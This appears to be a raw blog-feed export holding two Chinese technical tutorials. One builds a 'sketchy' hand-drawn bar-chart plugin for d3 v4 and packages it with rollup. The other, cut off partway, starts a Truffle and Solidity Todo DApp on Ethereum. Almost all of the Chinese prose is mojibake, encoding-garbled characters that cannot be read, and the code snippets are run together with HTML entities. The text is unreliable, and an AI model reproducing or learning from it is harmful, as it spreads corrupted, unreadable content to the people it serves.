é€™ç¯‡æ–‡ç« çš„ç¯„ä¾‹å°±æ˜¯ä¿®æ”¹è‡ªä»–ä¸‰å¹´å‰çš„ codeï¼Œç•¶æ™‚é‚„æ˜¯ v3 çš„ç‰ˆæœ¬ï¼Œä¼¼ä¹ä¹Ÿæ²’æœ‰å°‡å®ƒæ¨ä¸Š npmã€‚
æ‰€ä»¥é †ä¾¿åˆ©ç”¨é€™ç¯‡æ–‡ç« è¨˜éŒ„ä¸¦åˆ†äº«ä¸€ä¸‹å¦‚ä½•è£½ä½œå‡º Sketchy æ•ˆæœçš„é•·æ¢åœ–ï¼Œä¸¦ä¸”åŒ…è£æˆ d3 plugin ä¾†ä½¿ç”¨ï¼
å…ˆçµ¦å¤§å®¶çœ‹ä¸€ä¸‹æ¯”è¼ƒåœ–ï¼š
ä¸€èˆ¬çš„é•·æ¢åœ–ï¼š
å¥—ç”¨ sketchy æ•ˆæœçš„é•·æ¢åœ–ï¼š
æ˜¯ä¸æ˜¯ç¬é–“æ´»æ½‘å¾ˆå¤šå‘¢ï¼Ÿ
é›–ç„¶ä½ å¯èƒ½æœƒèªªé€™æ¨£å–ªå¤±äº†åœ–è¡¨çš„ç²¾æº–åº¦ï¼Œä½†å¾ˆå¤šæ™‚å€™æˆ‘å€‘åªéœ€è¦ç”¨ä¾†å¼·èª¿æ¯”è¼ƒæ€§çš„çµæœï¼Œé€™ç¨®æƒ…æ³å°±å¾ˆé©åˆäº†ã€‚
é‚£åˆ°åº•æ˜¯å¦‚ä½•åšåˆ°çš„å‘¢ï¼Ÿç¨å¾®ä»”ç´°è§€å¯Ÿä¸Šé¢çš„å…©å¼µåœ–ï¼Œä½ å¯èƒ½æœƒç™¼ç¾ï¼Œæ“æœ‰ Sketchy æ•ˆæœçš„é•·æ¢åœ–ï¼Œå¥½åƒå°‘äº†é–“è·ï¼Œå¤šäº†é»‘è‰²çš„æ‰‹ç¹ªç·¨æ¡†ã€‚
ç™¼ç¾åˆ°é€™é»ä»¥å¾Œï¼Œç­”æ¡ˆå°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼
å…¶å¯¦æ‰€è¬‚ Sketchy çš„æ•ˆæœï¼Œå°±åªæ˜¯åœ¨åŸæœ¬çš„é•·æ¢åœ–ä¸ŠåŠ å…¥äº†ä¸è¦å‰‡çš„é»‘è‰²é‚Šæ¡†ç·šæ¢ï¼
è€Œé€™äº›é»‘è‰²çš„é‚Šæ¡†å…¶å¯¦æ˜¯åˆ©ç”¨ svg çš„ path ä¾†ç¹ªè£½çš„ï¼Œæˆ‘å€‘æŠŠå®ƒæ‹†é–‹ä¾†çœ‹å°±å¾ˆæ¸…æ¥šï¼š
See the Pen sketchy-split by Arvin (@arvin0731) on CodePen.


é»‘è‰²çš„æ‰‹ç¹ªé¢¨æ ¼é‚Šæ¡†å…¶å¯¦æ˜¯åˆ©ç”¨è‡³å°‘ä¹æ¢ L ç·šæ®µç¹ªè£½å‡ºä¾†çš„ï¼Œç­‰æ–¼æ˜¯å°‡åŸæœ¬çš„é•·æ–¹åœ–ç”¨ç·šæ®µåŒ…èµ·ä¾†ï¼Œå¯¦ä½œä¸Šæˆ‘å€‘åªè¦åœ¨åŸæœ¬é•·æ¢åœ–çš„ x, y ä½ç½®èˆ‡å¯¬é«˜ä¸ŠåŠ ä¸Šä¸€äº›éš¨æ©Ÿè®Šå‹•çš„ offsetï¼Œå°±å¯ä»¥åšå‡ºé€™æ¨£çš„æ•ˆæœï¼åŸç†å…¶å¯¦å°±é€™éº¼ç°¡å–®ï¼

çŸ¥é“åŸç†ä»¥å¾Œä¾†çœ‹é» code å§ï¼æ—¢ç„¶ä»–çš„å¯¦ä½œåŸç†å¾ˆç°¡å–®ï¼Œæˆ‘å€‘ç†ç•¶å¯ä»¥å°‡å®ƒè®Šæˆä¸€å€‹ d3 çš„ pluginï¼Œåƒæ˜¯å…¶ä»– d3 v4 çš„æ¨¡çµ„ä¸€æ¨£ï¼Œè®“å…¶ä»–ä½¿ç”¨è€…éƒ½èƒ½å¤ é€é npm æˆ–æ˜¯ script çš„æ–¹å¼è¼‰å…¥ä½¿ç”¨ã€‚
è€Œè¦åšæˆ d3-plugin çš„è©±ï¼Œåœ¨ code çš„æ¶æ§‹ä¸Šæˆ‘å€‘å°±è¦ç¨å¾®æ³¨æ„ä¸€ä¸‹ã€‚
åŸºæœ¬ä¸Šæˆ‘å€‘å¸Œæœ›èƒ½æ²¿ç”¨ä¸€èˆ¬ä½¿ç”¨ d3 lib çš„èªæ³•ç¿’æ…£ï¼š
demod3.select(&#x27;#svgParent&#x27;).selectAll(&quot;g&quot;).data(data)    .enter()    .append(&quot;g&quot;)    .attr(&quot;class&quot;, &quot;bar&quot;);d3.select(&quot;#svgParent&quot;)    .selectAll(&quot;g.bar&quot;)    .each(function (d, i) &#123;        var x = i * 100 + 20;        var y = 500 - hscale(d) / 2;        var rw = 100;        var rh = hscale(d) / 2;        // 1. æˆ‘å€‘æƒ³å°‡æ­¤ plugin æ”¾åˆ° d3 çš„ global object å…§        // d3.sketchy å°±æ˜¯æˆ‘å€‘çš„ plugin        var sketchyBar = d3.sketchy.rect();        // 2. æˆ‘å€‘è¦èƒ½ chaining å‡½æ•¸        sketchyBar            .height(rh)            .width(rw)            .x(x)            .y(y)            .fill(color)            .stroke(&quot;black&quot;)            .strokeWidth(10)            .jostle(5)        // 3. æœ€å¾Œæˆ‘å€‘åˆ©ç”¨ d3-selection ä¾†å¹«æˆ‘å€‘é¸å– d3 DOM å‚³å…¥        d3.select(this).call(sketchyBar);    &#125;)

è¦é”åˆ°é€™ç¨®æ•ˆæœï¼Œå° Javascript ç†Ÿæ‚‰çš„ä½ æ‡‰è©²éƒ½ä¸å›°é›£ï¼Œæˆ‘å€‘åªè¦ export ä¸€å€‹ç‰©ä»¶ï¼Œåœ¨å…¶å…§è¨­å®šä¸€å€‹æœƒå›å‚³å‡½å¼çš„ functionï¼Œè£½ä½œå‡º closureï¼Œå†å¯¦ä½œç›¸å°æ‡‰çš„ setterï¼Œä¸¦ä¸”æ¯ä¸€å€‹ setter éƒ½å›å‚³ this å³å¯ã€‚
d3-sketchyimport &#123; select as d3Select, selectAll as d3SelectAll &#125; from &quot;d3-selection&quot;;import &#123; scaleLinear as d3ScaleLinear &#125; from &quot;d3-scale&quot;;import &#123; line as d3Line, curveLinear as d3CurveLinear &#125; from &quot;d3-shape&quot;;let d3sketchy = &#123;&#125;;d3sketchy.rect = function(selection) &#123;  let rh = 50, rw = 10, w = 2, c = [0, 0],    fillColor = &quot;red&quot;, strokeColor = &quot;black&quot;, jostle = 0;  function d3_sketchyRect(selection) &#123;      // ç¹ªè£½ sketchy é•·æ¢åœ–çš„ä¸»è¦å‡½å¼  &#125;  // å¯¦ä½œå„å€‹å±¬æ€§çš„ setter  d3_sketchyRect.height = function(data) &#123;    if (!arguments.length) return rh;    rh = data;    return this;  &#125;  d3_sketchyRect.width = function(data) &#123;    // ... ä½œæ³•èˆ‡ height ç›¸åŒ  &#125;  d3_sketchyRect.x = function(data) &#123; /* ... */ &#125;  d3_sketchyRect.y = function(data) &#123; /* ... */ &#125;  d3_sketchyRect.fill = function(data) &#123; /* ... */ &#125;  d3_sketchyRect.jostle = function(data) &#123; /* ... */ &#125;  // ... å¯ä»¥å†ç¹¼çºŒè¨­ç½®ä½ è¦çš„å‡½æ•¸  return d3_sketchyRect;&#125;export default d3sketchy;

è€Œ export å‡ºå»çš„ç‰©ä»¶å‡½å¼åŸ·è¡Œå¾Œæ‰€å›å‚³çš„ function å°±æ˜¯ç”¨ä¾†æ¥æ”¶ d3-selection å‚³éçµ¦æˆ‘å€‘çš„ d3 DOMï¼Œä¸¦ä¸”ç¹ªè£½ sketchy bar çš„å‡½å¼ï¼Œç›¸é—œçš„ code å¤§å®¶å¯ä»¥å¾ä¸‹é¢çš„ codepen çœ‹åˆ°ï¼Œæˆ–æ˜¯åˆ°æˆ‘çš„ github ä¸Šå»çœ‹ä¹Ÿå¯ä»¥ï¼š
See the Pen d3-sketchy demo I by Arvin (@arvin0731) on CodePen.


ç¹ªè£½ sketchy bar çš„å‡½å¼ä¸»è¦åšä¸‰ä»¶äº‹ï¼š

ç¹ªè£½ä¸€èˆ¬çš„é•·æ¢åœ–

Random ç”¢ç”Ÿä¸€äº›å‹•æ…‹ offset ï¼ˆåœ¨ d3_sketchyRect é€™å€‹å‡½å¼ä¸­å¯ä»¥çœ‹åˆ°æœ‰ä¸€æ®µçœ‹ä¼¼è¤‡é›œçš„è¨ˆç®—ï¼Œå…¶å¯¦å°±åªæ˜¯å°ç¨±çš„ç•«å‡ºå…§å¤–æ¡†ï¼Œåƒæ˜¯åœ¨åŸç†ä»‹ç´¹é‚£é‚Šçš„åœ–ä¸€æ¨£ï¼‰

ç”¨ Svg path ä¾†ç¹ªè£½æ‰‹ç¹ªé‚Šæ¡†


æœ€å¾Œä¾†æ‰“åŒ… Plugin å§ï¼å…¶å¯¦è¦æ‰“åŒ…ä¸€å€‹ lib æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œä½†æ˜¯ D3 çš„ä½œè€…åœ¨ D3 v4 å°šæœªæ¨å‡ºå‰å°±æœ‰å¯«äº†ä¸€ç¯‡æ–‡ç« ä»‹ç´¹è¦æ€éº¼æ¨£è£½ä½œä¸€å€‹ d3 pluginï¼Œç‚ºäº†è¦èƒ½ç›¡é‡å…±ç”¨æ‰€æœ‰çš„ d3 pluginï¼Œæœ€å¥½å¤§å®¶éƒ½æ˜¯éµç…§åŒæ¨£çš„æº–å‰‡ä¾†è™•ç†æœƒæ¯”è¼ƒå¥½ã€‚
ä¸éå…¶å¯¦ä¹Ÿæ²’ä»€éº¼æº–å‰‡ XDâ€¦ä¸»è¦æ¯”è¼ƒç‰¹åˆ¥çš„å°±æ˜¯ D3 çš„ plugin å¤§å¤šæ˜¯ç”¨ rollup ä¾†æ‰“åŒ…ï¼Œæˆ‘çŒœæƒ³æ˜¯å› ç‚ºç•¶æ™‚ webpack 1.x é‚„æ²’æœ‰åŠ å…¥ tree-shaking çš„åŠŸèƒ½ï¼Œè€Œé‡å° plugin é€™ç¨®å°å‹æ¨¡çµ„ä¾†èªªï¼Œä¹Ÿç”¨ä¸åˆ° webpack çš„è¨±å¤šåŠŸèƒ½ï¼Œrollup åè€Œæ¯”è¼ƒé©åˆç”¨ä¾†æ‰“åŒ… plugin æ¨¡çµ„ã€‚
å®Œæ•´çš„ code èˆ‡çµæ§‹å¯ä»¥ç›´æ¥åˆ° github ä¸Šåƒè€ƒï¼šd3-sketchy
æª”æ¡ˆçµæ§‹å¤§æ¦‚å°±æ˜¯é€™æ¨£ï¼š

åœ¨ä½ çš„ index.js ä¸­åŠ å…¥ï¼š
export &#123;default as sketchy&#125; from &quot;./src/sketchy&quot;;
ç•¶ä½œ module çš„å…¥å£ï¼Œä¹Ÿæ–¹ä¾¿ requireã€‚
æ¥è‘—åœ¨ä½ çš„ package.json ä¸­åŠ å…¥ scriptï¼š
package.json&quot;scripts&quot;: &#123;    &quot;pretest&quot;: &quot;rm -rf build &amp;&amp; mkdir build &amp;&amp; rollup -c rollup.config.js&quot;,    &quot;test&quot;: &quot;tape &#x27;test/**/*-test.js&#x27;&quot;,    &quot;prepublish&quot;: &quot;npm run test &amp;&amp; uglifyjs build/d3-sketchy.js -c -m -o build/d3-sketchy.min.js&quot;,    &quot;postpublish&quot;: &quot;zip -j build/d3-sketchy.zip -- LICENSE README.md build/d3-sketchy.js build/d3-sketchy.min.js&quot;&#125;

å¯ä»¥çœ‹åˆ°é€™é‚Šåœ¨ publish å‰éƒ½æœƒç”¨ uglify.js ä¾†ç”¢ç”Ÿ min.js æª”æ¡ˆï¼Œå¦‚æ­¤ä¸€ä¾†ä½ çš„ user å°±å¯ä»¥é¸æ“‡è¦ä¸è¦ä¸‹è¼‰ minify éçš„å¥—ä»¶ã€‚
æœ€å¾Œå°±æ˜¯æ’°å¯«ä½ çš„ rollup.config.jsï¼š
rollup.config.jsimport resolve from &#x27;rollup-plugin-node-resolve&#x27;;import babel from &#x27;rollup-plugin-babel&#x27;;export default &#123;    entry: &#x27;index.js&#x27;,    dest: &#x27;build/d3-sketchy.js&#x27;,    format: &#x27;umd&#x27;, // umd çš„æ ¼å¼èƒ½é€é CommonJS æˆ–æ˜¯ AMD è¼‰å…¥    moduleName: &#x27;d3&#x27;, // è¨­å®šç‚º d3 å¯ä»¥å°‡ä½ çš„ plugin æ”¾å…¥ global.d3 åº•ä¸‹    sourceMap: true,    plugins: [        resolve(),        babel(&#123;            exclude: &#x27;node_modules/**&#x27;        &#125;)    ]&#125;;

é€™é‚Šè¦æ³¨æ„å…©ä»¶äº‹æƒ…ã€‚

rollup ä¸æœƒå¹«ä½ æ‰“åŒ…ä½ å¾ node_modules è£¡é¢ import é€²ä¾†çš„æª”æ¡ˆï¼Œæ‰€ä»¥å¦‚æœä½ æœ‰ç”¨åˆ°å…¶ä»–çš„ d3 pluginï¼Œè®Šæˆåœ¨ä½ çš„ plugin èªªæ˜å…§è¦å‘ŠçŸ¥ä½¿ç”¨è€…ï¼Œè¨˜å¾—è¼‰å…¥ç›¸ä¾çš„ pluginã€‚æˆ–æ˜¯ä½ ä¹Ÿå¯ä»¥å‘æˆ‘é€™é‚Šä¸€æ¨£ï¼Œé€é rollup-plugin-node-resolve é€™å€‹ rollup plugin ä¾†å¹«æˆ‘å€‘æŠŠ node_modules åº•ä¸‹çš„ lib ä¹Ÿæ‰“åŒ…

rollup ä¸æœƒå¹«ä½ ç·¨è­¯ babelï¼Œå¦‚æœä½ çœŸçš„æƒ³ç”¨ babelï¼Œå°±åƒæˆ‘ä¸€æ¨£åŠ å…¥ rollup-plugin-babel å³å¯ã€‚

format è¨˜å¾—è¨­ç‚º umdï¼Œé€™æ¨£æ‰èƒ½å¤ åœ¨ CommonJS æˆ– AMD ç’°å¢ƒä¸‹éƒ½èƒ½ä½¿ç”¨ã€‚

æœ€é›·çš„ä¸€é»åœ¨é€™é‚Šï¼ç›®å‰ç”¨ rollup æ‰“åŒ… d3 plugin çš„è©±ï¼Œä½ éœ€è¦å°‡ roullup çš„ç‰ˆæœ¬é–åœ¨ 0.41ï¼Œå¦å‰‡ä½ æœƒç™¼ç¾ä½ ç·¨è­¯å‡ºä¾†çš„ build/d3-xxx.js å…§çš„æœ€å‰é¢å¹¾è¡Œé•·å¾—åƒé€™æ¨£ï¼š


(function (global, factory) &#123;	typeof exports === &#x27;object&#x27; &amp;&amp; typeof module !== &#x27;undefined&#x27; ? factory(exports) :	typeof define === &#x27;function&#x27; &amp;&amp; define.amd ? define([&#x27;exports&#x27;], factory) :	(factory((global.d3 = &#123;&#125;)));&#125;(this, (function (exports) &#123; &#x27;use strict&#x27;;

æœ‰çœ‹å‡ºä»€éº¼å•é¡Œå—ï¼Ÿ
factory((global.d3 = &#123;&#125;))
ä»–æœƒå°‡ global.d3 å¡å…¥ä¸€å€‹ç©ºç‰©ä»¶ï¼Œè€Œéå…ˆä½¿ç”¨åŸå…ˆçš„ global.d3ï¼šfactory((global.d3 = global.d3 || &#123;&#125;))
å¦‚æ­¤ä¸€ä¾†ï¼Œä½ å¦‚æœåœ¨è¼‰å…¥ plugin ä¹‹å‰å…ˆè¼‰å…¥å…¶ä»– d3 pluginï¼Œå°±æœƒç™¼ç”Ÿå•é¡Œäº†â€¦
&lt;script src=&quot;https://d3js.org/d3.v4.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;../build/d3-sketchy.js&quot;&gt;&lt;/script&gt; &lt;!-- è£¡é¢çš„ d3 object æœƒè“‹æ‰ä¸Šé¢ d3.v4.js ç”¢ç”Ÿçš„---&gt;

å¯èƒ½æœ‰å…¶ä»–è§£æ³•ï¼Œä½†çœ‹äº† d3 çš„ä¸€äº› plugin ä¹Ÿæ˜¯å…ˆå°‡ç‰ˆæœ¬å¡åœ¨ 0.41ã€‚
ç•¶ä½ åšå®Œä¸Šè¿°å·¥ä½œå¾Œï¼Œåœ¨ä½ çš„ repo åº•ä¸‹åŸ·è¡Œ npm installï¼Œå°±æœƒç”¢ç”Ÿ build folderï¼Œè£¡é¢å«æœ‰ï¼š

d3-sketchy.js
d3-sketchy.min.js
d3-sketchy.js.map (å¦‚æœä½  rollup.config.js æœ‰è¨­å®š sourceMap: true å°±æœƒæœ‰æ­¤æª”æ¡ˆ)

å¦‚æ­¤ä¸€ä¾†åˆ¥äººå°±èƒ½ä½¿ç”¨ä½ çš„ plugin äº†ï¼š
&lt;script src=&quot;../build/d3-sketchy.js&quot;&gt;&lt;/script&gt;&lt;script&gt;    var sketchyBar = d3.sketchy.rect();    //...    //..&lt;/script&gt;

çµè«–æœ‰äº›æ™‚å€™çœ‹ä¼¼å¾ˆè¤‡é›œçš„æ±è¥¿ï¼Œå…¶å¯¦åŸç†å»éå¸¸ç°¡å–®ï¼Œåªæ˜¯éœ€è¦ç™¼æ®é»å‰µæ„ã€‚å‰›å¥½é€éé€™ç¯‡ä¹Ÿå­¸ç¿’äº†ä¸€ä¸‹ rollup çš„ç›¸é—œè¨­å®šï¼Œé›–ç„¶æˆ‘ç§äººçŒœæ¸¬ rollup æ‡‰è©²é‚„æ˜¯æœƒæ…¢æ…¢è¢« webpack å£“éå»ï¼Œå³ä¾¿ rollup ä½œè€…å¯«äº†é€™ç¯‡æ–‡ç« ã€‚é€™ç¯‡ç®—æ˜¯ä¸€å€‹å°å°çš„ç­†è¨˜ï¼Œä¸æ˜¯å¤ªå®Œæ•´ï¼Œè‹¥æœ‰ä»»ä½•ç–‘å•æˆ–å»ºè­°æ­¡è¿ç•™è¨€è¨è«–ï¼
è³‡æ–™ä¾†æº
d3-sketchy
d3-plugin
rollup

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>plugin</tag>
        <tag>rollup</tag>
      </tags>
  </entry>
  <entry>
    <title>åœ¨ Ethereum ä¸Šé–‹ç™¼ç°¡å–®çš„ Todo App</title>
    <url>/2018/04/01/dapp-todo-on-ethereum/</url>
    <content><![CDATA[å‰è¨€è¿‘ä¸€å…©å¹´å€å¡Šéˆçš„æŠ€è¡“é€ æˆä¸€è‚¡ç†±æ½®ï¼Œç”±æ–¼åŠ å¯†è²¨å¹£åœ¨æŠ•è³‡ä¸Šçš„ç‚’ä½œï¼Œå¸¸çœ‹åˆ°çš„å€å¡Šéˆç¯„ä¾‹éƒ½æ˜¯å’Œè™›æ“¬è²¨å¹£ç›¸é—œé€£çš„æœå‹™ï¼Œå¦å¤–ï¼ŒæŠ€è¡“çš„æ‡‰ç”¨ç„¦é»ä¹Ÿå¸¸æ”¾åœ¨é‡‘èå’Œæœƒè¨ˆæ¥­ä¸Šï¼Œé€™æ˜¯å› ç‚ºé€™å…©å€‹è¡Œæ¥­é•·ä¹…ä»¥ä¾†åœ¨å¸‚å ´ä¸Šéƒ½æœ‰çƒå“¡å…¼è£åˆ¤çš„å«Œç–‘ï¼ˆä¾‹å¦‚æœƒè¨ˆæœ‰è³‡ç”¢ä¿¡ç”¨èƒŒæ›¸å’Œè¢«é›‡ç”¨äººé€™å…©ç¨®çŸ›ç›¾çš„è§’è‰²ï¼‰ï¼Œå› æ­¤éœ€è¦ä¸€å€‹ã€Œå‚™å—ä¿¡ä»»ã€çš„æ©Ÿåˆ¶ä¾†é‡æ‹¾å¸‚å ´å°å®ƒå€‘çš„ä¿¡ä»»ã€‚è€Œå€å¡Šéˆï¼Œæˆ–æ˜¯å»£ç¾©ä¸Šä¾†èªªçš„åˆ†æ•£å¼è³¬æœ¬æŠ€è¡“ï¼Œæ­£æ˜¯ä¸€å€‹æœ‰æ½›åŠ›çš„è§£æ³•ã€‚ä¸éå°±åƒã€Šå€å¡Šéˆé©å‘½ã€‹é€™æœ¬æ›¸æ‰€èªªçš„ï¼Œé€™å€‹æŠ€è¡“å¯¦ç¾äº†ã€Œåƒ¹å€¼ä¸Šçš„è½‰ç§»ã€ï¼Œç†ç•¶æœƒå°æ›´å¤šçš„è¡Œæ¥­å¸¶ä¾†å½±éŸ¿ã€‚
Ethereum æå‡º DApp(Decentralized App) çš„æƒ³æ³•ï¼Œä¹Ÿå°±æ˜¯è—‰è‘—å€å¡Šéˆä¸Šä½ˆç½²çš„æ™ºæ…§åˆç´„ï¼ˆSmart Contractï¼‰å°å€å¡Šéˆè³‡æ–™é€²è¡Œæ“ä½œï¼Œä½¿å¾—ä¸ä½†è³‡æ–™ç„¡æ³•è¢«ç«„æ”¹ï¼Œé€£åˆç´„ï¼ˆç¨‹å¼ç¢¼ï¼‰æœ¬èº«ä¹Ÿç„¡æ³•è¢«ç«„æ”¹ï¼Œå› æ­¤é€™äº›åˆç´„å¯ä»¥åœ¨æ²’æœ‰ç¬¬ä¸‰æ–¹ï¼ˆä¾‹å¦‚å¾‹å¸«ï¼‰çš„è¦‹è­‰ä¸‹å…·æœ‰ä¿¡ç”¨ã€‚ä»¥ä¸‹ç°¡å–®çš„å°‡å‚³çµ± web app å’Œ DApp ä½œé¡æ¯”ï¼š



â€“
â€“
â€“
â€“



Web app
front-end
back-end API
Database


DApp
front-end
smart contract
Blockchain(Ethereum)


ç”±æ–¼é€™ç¯‡åªæœƒæåˆ°é–‹ç™¼ Todo ç¨‹å¼çš„å¿…è¦éƒ¨åˆ†ï¼Œå¦‚æœéœ€è¦æ›´å®Œæ•´å°æ–¼æ™ºæ…§åˆç´„çš„ä»‹ç´¹å’Œ Ethereum çš„ç›¸é—œçŸ¥è­˜å¯ä»¥åƒè€ƒ Taipei Ethereum Meetup çš„éƒ¨è½æ ¼æˆ–æ˜¯ gasolin ç¶²å‹ç·¨å¯«çš„ gitbookã€‚
å¦å¤–ï¼Œé›–ç„¶é€™è£¡åªæ˜¯å¯¦ä½œä¸€å€‹ç°¡å–®çš„ Todo ç¨‹å¼ï¼Œä½†æ˜¯å¯ä»¥æƒ³åƒå¦‚æœæ“´å±•æˆæ¥æ¡ˆå¹³å°çš„æ ¸å¿ƒï¼Œç™¼åŒ…äººå’Œæ¥æ¡ˆäººå•†é‡ä¸€å€‹å®Œæˆä»»å‹™çš„è©•ä¼°æ–¹å¼å’Œå ±é…¬ï¼Œä¾‹å¦‚å®Œæˆå¹¾å€‹æ¸¬è©¦å¾Œæœƒæ”¶åˆ°å¤šå°‘æ¬¾é …ï¼Œæ¥è‘—å°‡å‰›å‰›çš„åˆç´„å¯«å…¥ DAappï¼Œæœªä¾†åªè¦æ¥æ¡ˆäººçš„å°ˆæ¡ˆé€šéæ¸¬è©¦å¾Œå°±èƒ½è‡ªå‹•å®Œæˆæ”¶æ¬¾ã€‚
ä»¥ä¸‹å° DApp çš„å¯¦ä½œåˆ©ç”¨ Truffle é€™å€‹é–‹ç™¼æ¡†æ¶ï¼Œä»¥ Solidityï¼ˆEthereum å®˜æ–¹é–‹ç™¼çš„ç·¨ç¨‹èªè¨€ï¼‰é–‹ç™¼æ™ºæ…§åˆç´„ï¼Œä¸¦åˆ©ç”¨ javascript çš„ web3.js å¥—ä»¶å’Œåˆç´„æºé€šï¼Œä»¥ä¸‹åˆ†åˆ¥å°±é€™å…©å€‹å·¥å…·ä»‹ç´¹ã€‚å¦å¤–å¦‚æœä½¿ç”¨ VSCode é–‹ç™¼ï¼Œå¯ä»¥å®‰è£ Solidity çš„é–‹ç™¼å·¥å…·ï¼Œæ–¹ä¾¿æª¢æŸ¥èªæ³•ä¸Šçš„å•é¡Œã€‚
é€™æ˜¯é€™ç¯‡æ‰€ä½¿ç”¨åˆ°çš„ç¨‹å¼ç¢¼
Truffle - Ethereum Development FrameworkTruffle æ˜¯ Ethereumï¼ˆä»¥å¤ªåŠï¼‰çš„é–‹ç™¼æ¡†æ¶ï¼Œå¯ä»¥å»ºç«‹æ¸¬è©¦ç”¨çš„å€å¡Šéˆï¼Œä¸¦å°‡å¯«å¥½çš„æ™ºæ…§åˆç´„ç·¨è­¯ä½ˆç½²ï¼Œç”±æ–¼ä»¥å¤ªåŠçš„é–‹ç™¼ç’°å¢ƒè®Šå‹•çš„ç›¸ç•¶å¿«ï¼Œå› æ­¤å‹™å¿…æ³¨æ„åˆ°ä¸åŒç‰ˆæœ¬çš„æ”¯æ´å•é¡Œã€‚é€™è£¡ä½¿ç”¨æœ€æ–°çš„ truffle ç‰ˆæœ¬(v4.1.3)ï¼Œå› ç‚ºé€™å€‹ç‰ˆæœ¬å»ºç«‹çš„æ¸¬è©¦ç”¨å€å¡Šéˆæ”¯æ´ websocket é€£ç·šï¼Œé…åˆ web3.js v1.0 ä¹‹å¾Œçš„ç‰ˆæœ¬å¯ä»¥åˆ©ç”¨ socket ç›£è½äº‹ä»¶çš„è§¸ç™¼ï¼Œé€™æ˜¯æ¯”è¼ƒæœ‰æ•ˆç‡çš„ä½œæ³•ã€‚
Step1. å®‰è£ trufflenpm install -g truffle@4.1.3

Step2. å»ºç«‹å°ˆæ¡ˆè³‡æ–™ä¸¦åˆå§‹åŒ–mkdir EthereumTodo &amp;&amp; cd EthereumTodotruffle init# è³‡æ–™å¤¾çµæ§‹å¦‚ä¸‹# build/       åˆç´„ç·¨è­¯å®Œæ‰æœƒç”¢ç”Ÿï¼Œé€™è£¡æœƒç”Ÿæˆæè¿°åˆç´„çš„ json æª”ï¼ŒåŒ…å«åˆç´„çš„ ABI(Application Binary Interface)# contracts/   åˆç´„çš„æª”æ¡ˆï¼Œä»¥ .sol ç‚ºçµå°¾# migrations/  æè¿°å¦‚ä½•å°‡åˆç´„ä½ˆç½²åˆ°å€å¡Šéˆ# test/        ç”¨ä¾†æ¸¬è©¦åˆç´„# truffle.js   è¨­å®š truffle

Step3. æŸ¥çœ‹ç‰ˆæœ¬è³‡è¨Štruffle version# Truffle v4.1.3 (core: 4.1.3)# Solidity v0.4.19 (solc-js)
è«‹å‹™å¿…å…ˆæª¢æŸ¥æ”¯æ´çš„ Solidity ç‰ˆæœ¬ï¼Œç”±æ–¼ç›®å‰é€™å€‹èªè¨€è®Šå‹•å¾ˆå¿«ï¼Œéœ€è¦æ›´åŠ æ³¨æ„ç‰ˆæœ¬é–“çš„èªæ³•å·®ç•°ã€‚
Step4. å»ºç«‹æ¸¬è©¦ç”¨å€å¡Šéˆ# ganache-cli æ˜¯ truffle å…§é™„çš„æŒ‡ä»¤ï¼Œç”¨ä¾†å–ä»£åŸå…ˆçš„ testrpc# ç”¨ --seed apple banana cherryï¼ŒæŒ‡å®šéš¨æ©Ÿç”Ÿæˆçš„ç¨®å­ï¼Œé€™æ¨£å¯ä»¥ç¢ºä¿æ¯æ¬¡å»ºç«‹çš„å€å¡Šéˆéƒ½æ˜¯ç›¸åŒçš„ï¼Œ# å¦‚æ­¤ä¸€ä¾†åˆç´„çš„ä½ˆç½²ä½å€ä¹Ÿæœƒç›¸åŒï¼Œé€™åœ¨æ¸¬è©¦ç’°å¢ƒä¸Šéå¸¸å¥½ç”¨ganache-cli --seed apple banana cherry## åŸ·è¡Œçµæœæœƒé †ä¾¿ç”¢ç”Ÿæ¸¬è©¦ç”¨çš„å¸³è™Ÿå’Œ keyï¼Œå¸³è™Ÿæœƒåœ¨ä¹‹å¾ŒåŸ·è¡Œåˆç´„æ™‚ç”¨åˆ°# Available Accounts# ==================# (0) 0x1d489c3f8ed5ee71325a847888b2157c9ac29c05# ...# Private Keys# ==================# (0) bea70301d065cf7946f25251c73dbfff93d4320715e43bdc0d5087553074cb64# ...# Listening on localhost:8545

Step5. è¨­å®š truffle ç’°å¢ƒ// truffle.jsmodule.exports = &#123;  networks: &#123;    development: &#123;      host: &quot;localhost&quot;,      port: 8545,     // default port of ganache-cli      network_id: &quot;*&quot; // Match any network id    &#125;  &#125;&#125;;

å»ºç«‹ Todo åˆç´„Step1. è¨­å®šè³‡æ–™çµæ§‹// contracts/TodoFactory.sol// æŒ‡å®šç·¨è­¯çš„ç‰ˆæœ¬pragma solidity ^0.4.17;// æŒ‡å®šåˆç´„çš„åç¨±ï¼Œä¹‹å¾Œä½ˆç½²æˆ–æ˜¯æ¸¬è©¦æ™‚éƒ½æ˜¯æ ¹æ“šé€™å€‹åç¨±ï¼ˆä¸æ˜¯æª”æ¡ˆåç¨±ï¼‰contract TodoFactory &#123;  struct Todo &#123;    string taskName;    bool isCompleted;    bool isValid;  &#125;  Todo[] todos;&#125;
ä»¥ä¸Šç°¡å–®çš„è¨­å®šåœ¨åˆç´„ä¸­è³‡æ–™å„²å­˜çš„æ–¹å¼ï¼Œåˆ©ç”¨ struct åŒ…è£¹æ¯å€‹ todo æ‡‰è©²åŒ…å«çš„è³‡æ–™ï¼Œä¸¦åˆ©ç”¨é™£åˆ—å„²å­˜ã€‚Solidty å¸¸ç”¨çš„å‹åˆ¥åŒ…å«int(uint, uint256), uint8, bool, address(8 bytes), byte ï¼Œè€Œ string ç›¸ç•¶æ–¼æ˜¯ byte[]ã€‚ç”±æ–¼å„²å­˜è³‡æ–™åœ¨å€å¡Šéˆä¸Šç›¸ç•¶è€—è²»æˆæœ¬ï¼ˆä»¥ POW æ©Ÿåˆ¶ä¾†èªªï¼Œå°±æ˜¯éœ€è¦æœ‰äººæŒ–ç¤¦ï¼‰ï¼Œæ™ºæ…§åˆç´„çš„åŸ·è¡Œä¸Šä¹Ÿå¿…é ˆæ¶ˆè€— gasï¼Œå› æ­¤æœƒç›¡å¯èƒ½çš„é¸ç”¨é©ç•¶çš„å‹åˆ¥ä»¥æ¸›å°‘å¯«å…¥çš„è³‡æ–™é‡å’Œé‹ç®—é‡ï¼Œå¦å¤–åœ¨ struct 